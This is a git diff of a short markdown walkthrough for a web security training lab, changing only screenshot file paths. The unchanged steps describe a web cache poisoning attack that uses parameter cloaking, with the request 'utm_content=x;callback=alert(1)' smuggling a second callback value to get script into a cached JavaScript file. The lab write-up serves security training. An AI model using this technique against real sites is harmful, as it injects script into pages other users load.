@@ -10,20 +10,20 @@
 
 send geolocate.js to repeter
 
-![screenshot](./images/lab7_geolocate_js_file_to_repeter.png)
+![screenshot](images/lab7_geolocate_js_file_to_repeter.jpg)
 
 ### step2
 
 send param minier to rails param miner cloaking scan
 
-![screenshot](./images/lab7_rails_param_cloaking_scan.png)
+![screenshot](images/lab7_rails_param_cloaking_scan.jpg)
 
 ### step3
 
 add _&utm_content=x;callback=akzldka&ipy1trc2=1_
 final url _GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=akzldka&ipy1trc2=1_
 
-![screenshot](./images/lab7_utm_callaback_request.png)
+![screenshot](images/lab7_utm_callaback_request.jpg)
 
 ### step4
 
@@ -31,4 +31,4 @@ payload:alert(1)
 _GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert(1)_
 send request many times to solve the lab
 
-![screenshot](./images/lab7_callback_payload.png)
+![screenshot](images/lab7_callback_payload.jpg)
